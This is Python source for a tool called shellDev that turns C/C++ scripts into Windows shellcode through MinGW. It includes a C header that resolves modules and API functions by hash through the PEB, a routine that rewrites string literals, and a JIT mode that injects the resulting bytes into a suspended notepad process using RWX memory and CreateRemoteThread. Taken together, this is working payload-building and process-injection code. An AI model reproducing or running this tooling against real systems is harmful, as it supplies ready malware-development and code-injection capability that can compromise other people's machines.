# -------------------- Injection ------------------- #

from ctypes import *
import ctypes
import ctypes.wintypes

from ctypes.wintypes import BOOL
from ctypes.wintypes import DWORD
from ctypes.wintypes import HANDLE
from ctypes.wintypes import LPVOID
from ctypes.wintypes import LPCVOID
import win32process

title = \
    """
          _          _ _ _____
         | |        | | |  __ \\
      ___| |__   ___| | | |  | | _____   __
     / __| '_ \\ / _ \\ | | |  | |/ _ \\ \\ / /
     \\__ \\ | | |  __/ | | |__| |  __/\\ V /
     |___/_| |_|\\___|_|_|_____/ \\___| \\_/

    v1.3 by aaaddress1@chroot.org
    """

LPCSTR = LPCTSTR = ctypes.c_char_p
LPDWORD = PDWORD = ctypes.POINTER(DWORD)


class SecurityAttributes(ctypes.Structure):
    _fields_ = [('nLength', DWORD),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', BOOL), ]


LPSECURITY_ATTRIBUTES = ctypes.POINTER(SecurityAttributes)
LPTHREAD_START_ROUTINE = LPVOID


def jit_inject(path, shellcode):
    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000

    shellcode_length = len(shellcode)
    process_handle = info[0].handle  # phandle

    virtual_alloc_ex = windll.kernel32.VirtualAllocEx
    virtual_alloc_ex.restype = LPVOID
    virtual_alloc_ex.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)

    write_process_memory = ctypes.windll.kernel32.WriteProcessMemory
    write_process_memory.restype = BOOL
    write_process_memory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)

    create_remote_thread = ctypes.windll.kernel32.CreateRemoteThread
    create_remote_thread.restype = HANDLE
    create_remote_thread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)

    lp_buffer = virtual_alloc_ex(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
    print(hex(lp_buffer))
    write_process_memory(process_handle, lp_buffer, shellcode, shellcode_length, 0)
    create_remote_thread(process_handle, None, 0, lp_buffer, 0, 0, 0)
    print('JIT Injection, done.')


# -------------------------------------------------- #


import subprocess
import re
import os
import sys
from optparse import OptionParser
import hashlib

shellDevHpp = \
    """
    #include <Windows.h>
    #include <stdio.h>
    #include <stdint.h>
    
    typedef struct _PEB_LDR_DATA
    {
        ULONG Length;
        UCHAR Initialized;
        PVOID SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
    } PEB_LDR_DATA, *PPEB_LDR_DATA;
    typedef struct _UNICODE_STRING32
    {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR Buffer;
    } UNICODE_STRING32, *PUNICODE_STRING32;
    typedef struct _PEB32
    {
        UCHAR InheritedAddressSpace;
        UCHAR ReadImageFileExecOptions;
        UCHAR BeingDebugged;
        UCHAR BitField;
        ULONG Mutant;
        ULONG ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        ULONG ProcessParameters;
        ULONG SubSystemData;
        ULONG ProcessHeap;
        ULONG FastPebLock;
        ULONG AtlThunkSListPtr;
        ULONG IFEOKey;
        ULONG CrossProcessFlags;
        ULONG UserSharedInfoPtr;
        ULONG SystemReserved;
        ULONG AtlThunkSListPtr32;
        ULONG ApiSetMap;
    } PEB32, *PPEB32;
    typedef struct _PEB_LDR_DATA32
    {
        ULONG Length;
        BOOLEAN Initialized;
        ULONG SsHandle;
        LIST_ENTRY32 InLoadOrderModuleList;
        LIST_ENTRY32 InMemoryOrderModuleList;
        LIST_ENTRY32 InInitializationOrderModuleList;
        ULONG EntryInProgress;
    } PEB_LDR_DATA32, *PPEB_LDR_DATA32;
    typedef struct _LDR_DATA_TABLE_ENTRY32
    {
        LIST_ENTRY32 InLoadOrderLinks;
        LIST_ENTRY32 InMemoryOrderModuleList;
        LIST_ENTRY32 InInitializationOrderModuleList;
        ULONG DllBase;
        ULONG EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING32 FullDllName;
        UNICODE_STRING32 BaseDllName;
        ULONG Flags;
        USHORT LoadCount;
        USHORT TlsIndex;
        union
        {
            LIST_ENTRY32 HashLinks;
            ULONG SectionPointer;
        };
        ULONG CheckSum;
        union
        {
            ULONG TimeDateStamp;
            ULONG LoadedImports;
        };
        ULONG EntryPointActivationContext;
        ULONG PatchInformation;
    } LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;
    typedef struct _PROCESS_BASIC_INFORMATION64 {
        ULONG64 ExitStatus;
        ULONG64 PebBaseAddress;
        ULONG64 AffinityMask;
        ULONG64 BasePriority;
        ULONG64 UniqueProcessId;
        ULONG64 InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION64, *PPROCESS_BASIC_INFORMATION64;
    typedef struct _PEB64
    {
        UCHAR InheritedAddressSpace;
        UCHAR ReadImageFileExecOptions;
        UCHAR BeingDebugged;
        UCHAR BitField;
        ULONG64 Mutant;
        ULONG64 ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        ULONG64 ProcessParameters;
        ULONG64 SubSystemData;
        ULONG64 ProcessHeap;
        ULONG64 FastPebLock;
        ULONG64 AtlThunkSListPtr;
        ULONG64 IFEOKey;
        ULONG64 CrossProcessFlags;
        ULONG64 UserSharedInfoPtr;
        ULONG SystemReserved;
        ULONG AtlThunkSListPtr32;
        ULONG64 ApiSetMap;
    } PEB64, *PPEB64;
    typedef struct _PEB_LDR_DATA64
    {
        ULONG Length;
        BOOLEAN Initialized;
        ULONG64 SsHandle;
        LIST_ENTRY64 InLoadOrderModuleList;
        LIST_ENTRY64 InMemoryOrderModuleList;
        LIST_ENTRY64 InInitializationOrderModuleList;
        ULONG64 EntryInProgress;
    } PEB_LDR_DATA64, *PPEB_LDR_DATA64;
    typedef struct _UNICODE_STRING64
    {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR Buffer;
    } UNICODE_STRING64, *PUNICODE_STRING64;
    typedef struct _LDR_DATA_TABLE_ENTRY64
    {
        LIST_ENTRY64 InLoadOrderLinks;
        LIST_ENTRY64 InMemoryOrderModuleList;
        LIST_ENTRY64 InInitializationOrderModuleList;
        ULONG64 DllBase;
        ULONG64 EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING64 FullDllName;
        UNICODE_STRING64 BaseDllName;
        ULONG Flags;
        USHORT LoadCount;
        USHORT TlsIndex;
        union
        {
            LIST_ENTRY64 HashLinks;
            ULONG64 SectionPointer;
        };
        ULONG CheckSum;
        union
        {
            ULONG TimeDateStamp;
            ULONG64 LoadedImports;
        };
        ULONG64 EntryPointActivationContext;
        ULONG64 PatchInformation;
    } LDR_DATA_TABLE_ENTRY64, *PLDR_DATA_TABLE_ENTRY64;
    
    # define FORCE_INLINE __attribute__((always_inline)) inline
    # define NOINLINE __declspec(noinline)
    # define shellFunc __attribute__((fastcall)) __attribute__((section("shell"))) NOINLINE
    
    void shellFunc shellEntry(void);
    
    template<class T> struct func {
        explicit func(FARPROC ptr) : _ptr(ptr) {}
        operator T() { return reinterpret_cast<T>(_ptr); }
        FARPROC _ptr;
    };
    
    uint32_t shellFunc modHash(wchar_t *modName) {
        uint32_t buf = 0;
        while (*(modName++)) {
            buf += (*modName | 0x20);
            buf = (buf << 24 | buf >> (sizeof(uint32_t) * 8 - 24)); /* rotl */
        }
        return buf;
    }
    
    uint32_t shellFunc modHash(char *modName) {
        uint32_t buf = 0;
        while (*(modName++)) {
            buf += (*modName | 0x20);
            buf = (buf << 24 | buf >> (sizeof(uint32_t) * 8 - 24)); /* rotl */
        }
        return buf;
    }
    
    PVOID shellFunc getModAddrByHash(uint32_t targetHash)
    {
    #ifdef _WIN64
        PPEB64 pPEB = (PPEB64)__readgsqword(0x60);
        PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
        PLIST_ENTRY curr = header->Flink;
        for (; curr != header; curr = curr->Flink) {
            LDR_DATA_TABLE_ENTRY64 *data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY64, InMemoryOrderModuleList);
            if (modHash(data->BaseDllName.Buffer) == targetHash)
                return (PVOID)data->DllBase;
        }
    #else
        PPEB32 pPEB = (PPEB32)__readfsdword(0x30);
        PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
        PLIST_ENTRY curr = header->Flink;
        for (; curr != header; curr = curr->Flink) {
            LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderModuleList);
            if (modHash(data->BaseDllName.Buffer) == targetHash)
                return (PVOID)data->DllBase;
        }
    #endif
        return 0;
    }
    
    PVOID shellFunc getFuncAddrByHash(HMODULE module, uint32_t targetHash)
    {
    #if defined _WIN64
        PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
    #else
        PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
    #endif
        PIMAGE_DATA_DIRECTORY impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (impDir->VirtualAddress == 0) return (size_t)0;
    
        PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);
        if (ied->NumberOfNames == 0) return (size_t)0;
    
        for (DWORD i = 0; i < ied->NumberOfNames; i++)
        {
            LPDWORD curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
            if (curName && (modHash((LPSTR)((LPBYTE)module + *curName)) == targetHash))
            {
                LPWORD pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
                curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
                return (PVOID)((size_t)module + *curName);
            }
        }
        return (size_t)0;
    }
    
    PVOID blindFindFunc(uint32_t funcNameHash)
    {
        PVOID retAddr = (size_t)0;
    #ifdef _WIN64
        PPEB64 pPEB = (PPEB64)__readgsqword(0x60);
        PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
        PLIST_ENTRY curr = header->Flink;
        for (; curr != header; curr = curr->Flink) {
            LDR_DATA_TABLE_ENTRY64 *data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY64, InMemoryOrderModuleList);
            retAddr = getFuncAddrByHash((HMODULE)data->DllBase, funcNameHash);
            if (retAddr) return retAddr;
        }
    #else
        PPEB32 pPEB = (PPEB32)__readfsdword(0x30);
        PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
        PLIST_ENTRY curr = header->Flink;
    
        for (; curr != header; curr = curr->Flink) {
            LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderModuleList);
            retAddr = getFuncAddrByHash((HMODULE)data->DllBase, funcNameHash);
            if (retAddr) return retAddr;
        }
    #endif
        return (size_t)0;
    }
    
    #define getModAddr(libraryName) (HMODULE)( \
        getModAddrByHash(modHash(libraryName)) \
        )
    
    #define getFuncAddr(libraryAddress, functionName) (PVOID)( \
        getFuncAddrByHash(libraryAddress, modHash(functionName)) \
        )
    """


def compile_cto_asm_file(c_path, asm_path, arch):
    global mingw_path
    subprocess.call([
        os.path.join(mingw_path, 'gcc'),
        '-fno-asynchronous-unwind-tables',
        '-s',
        '-O3',
        '-ffunction-sections',
        '-S',
        '-Wa,-R',
        '-Wa,-mintel',
        '-falign-functions=1',
        arch,
        '-c', c_path,
        '-o', asm_path
    ], cwd=mingw_path)


def jmp_shell_code_entry(in_asm_path, out_asm_path):
    with open(in_asm_path, 'r') as r:
        src = r.read()
        # src = src.replace('.rdata', 'shell')
        if src.count(".rdata") > 0:
            print('[!] Detect global variables !! It\'dangerous !! Take Care!!')

        func_name_arr = re.findall(r'.globl[\t\x20]+(.+)', src, re.IGNORECASE)
        entry_func = ''
        for eachFunc in func_name_arr:
            if 'shellEntry' in eachFunc:
                entry_func = eachFunc

        with open(out_asm_path, 'w') as w:
            w.write('.section shell,"x"\r\njmp %s\r\nnop\r\n' % entry_func + src)


def gen_obj_asm_binary(in_asm_path, out_object_file_path, out_asm_raw_bin_path, arch):
    global mingw_path
    subprocess.call([
        os.path.join(mingw_path, 'gcc'),
        arch,
        '-c', in_asm_path,
        '-o', out_object_file_path
    ], cwd=mingw_path)
    subprocess.call([
        os.path.join(mingw_path, 'objcopy'),
        '-O', 'binary',
        out_object_file_path,
        '-j', 'shell',
        out_asm_raw_bin_path
    ], cwd=mingw_path)


def arrayify_binary_raw_file(binary):
    data_hex_arr = ', '.join(['0x%02X' % i for i in binary])
    data_hex_arr = re.sub('(' + '0x\\w\\w, ' * 12 + ')', r'\1\n', data_hex_arr)
    retn = 'unsigned char shellcode[] = {\n%s };\r\n' % data_hex_arr
    retn += 'unsigned int shellcode_size = %i;\n' % len(binary)
    return retn


def gen_shellcode(cpp_path, clear_after_run, arch, jit_inj=None):
    current_dir = os.getcwd()

    if len(os.path.dirname(cpp_path)) == 0:
        cpp_path = os.path.join(current_dir, cpp_path)
        if not os.path.exists(cpp_path):
            print('shellDev script not found at %s\n' % cpp_path)
            sys.exit(1)

    print('[v] shellDev script at %s' % cpp_path)
    pre_script_path = os.path.splitext(cpp_path)[0]
    post_script_path = os.path.splitext(cpp_path)[1]

    cpp = pre_script_path + post_script_path
    tmpcpp = pre_script_path + '_tmp.cpp'
    asm = pre_script_path + 's'
    shell_asm = pre_script_path + '_shell.s'
    obj = pre_script_path + '.o'
    binraw = pre_script_path + '.bin'
    shelltxt_out = pre_script_path + '_shellcode.txt'
    shellcode_bin = pre_script_path + '_shellcode.bin'
    with open(cpp, 'r') as i:
        script = i.read()
        tmpscript = ''
        for line in script.splitlines():

            addition_data = ''
            if 'fetchAPI' in line:
                m = re.compile(r'.*fetchAPI\([\x20]*([^,)]+)[\x20]*,[\x20]*([^)]+)[\x20]*\)').match(line)
                replace_data = '''
char str_%(definedFuncName)s[] = "%(WinApiName)s";
func<decltype(&%(WinApiName)s)> %(definedFuncName)s( (FARPROC) blindFindFunc( modHash(str_%(definedFuncName)s) ) );
''' % {'definedFuncName': m.group(1).replace('\x20', ''), 'WinApiName': m.group(2).replace('\x20', '')}
                print('[+] Detect fetchAPI() from %s -> %s' % (
                    m.group(2).replace('\x20', ''), m.group(1).replace('\x20', '')))
                line = line.replace(m.group(0), replace_data)

            for argStr in re.findall(r'[(\x20,]+(\x22[^\x22]+\x22)[\x20,)]', line):
                arg_str_new_name = 'str_' + hashlib.md5(argStr.encode()).hexdigest()
                addition_data += 'char %s[] = %s;\n' % (arg_str_new_name, argStr)
                line = line.replace(argStr, arg_str_new_name)
            tmpscript += addition_data + line + '\n'

        tmpscript = tmpscript.replace('#include <shellDev>', shellDevHpp)
        with open(tmpcpp, 'w') as w:
            w.write(tmpscript)

    compile_cto_asm_file(tmpcpp, asm, '-m32' if arch == 'x86' else '-m64')
    jmp_shell_code_entry(asm, shell_asm)
    gen_obj_asm_binary(shell_asm, obj, binraw, '-m32' if arch == 'x86' else '-m64')

    shellcode_bytecode = open(binraw, 'rb').read()
    if jit_inj:
        if arch == 'x86':
            print('[+] jit mode: 32bit')
            jit_inject('C:\\Windows\\SysWoW64\\notepad.exe', shellcode_bytecode)
        elif arch == 'x64':
            print('[+] jit mode: 64bit')
            jit_inject('C:\\Windows\\System32\\notepad.exe', shellcode_bytecode)
    else:
        with open(shelltxt_out, 'w') as w:
            w.write(arrayify_binary_raw_file(shellcode_bytecode))
            print('[v] shellcode saved at %s' % shelltxt_out)
        with open(shellcode_bin, 'wb') as w:
            w.write(shellcode_bytecode)
            print('[v] shellcode *binary* saved at %s' % shellcode_bin)

    if clear_after_run:
        os.remove(asm)
        os.remove(shell_asm)
        os.remove(obj)
        os.remove(tmpcpp)
        os.remove(binraw)


def chk_exe_exist(name, path):
    if os.path.exists(path):
        print('\t[v] %s exists!' % name)
    else:
        print('\t[x] %s not found at %s' % (name, path))
        sys.exit(1)


def chk_mingw_toolkit(usr_input_min_gw_path):
    global mingw_path
    mingw_path = usr_input_min_gw_path
    if 'bin' not in mingw_path:
        mingw_path = os.path.join(mingw_path, 'bin')
        if os.path.exists(mingw_path):
            print('[v] check mingw tool path: %s ' % mingw_path)
        else:
            print('[x] sorry, mingw toolkit not found in %s' % mingw_path)
    chk_exe_exist('gcc', os.path.join(mingw_path, 'gcc.exe'))
    chk_exe_exist('as', os.path.join(mingw_path, 'as.exe'))
    chk_exe_exist('objcopy', os.path.join(mingw_path, 'objcopy.exe'))
    print('')


def main():
    print(title)
    parser = OptionParser()
    parser.add_option("-s", "--src", dest="source",
                      help="shelldev c/c++ script path.", metavar="PATH")
    parser.add_option("-m", "--mgw", dest="mingwPath",
                      help="set mingw path, mingw path you select determine payload is 32bit or 64bit.", metavar="PATH")
    parser.add_option("--noclear",
                      action="store_true", dest="dontclear", default=False,
                      help="don't clear junk file after generate shellcode.")

    parser.add_option("-a", "--arch", dest="arch",
                      help="Arch - should be x86 or x64")

    parser.add_option("--jit",
                      action="store_true", dest="jit", default=False,
                      help="Just In Time Compile and Run Shellcode (as x86 Shellcode & Inject to Notepad for test, "
                           "require run as admin.)")

    (options, args) = parser.parse_args()
    if options.source is None or options.mingwPath is None or options.arch not in ['x86', 'x64']:
        parser.print_help()
    else:
        chk_mingw_toolkit(options.mingwPath)
        gen_shellcode(options.source, not options.dontclear, options.arch, options.jit)


if __name__ == "__main__":
    main()
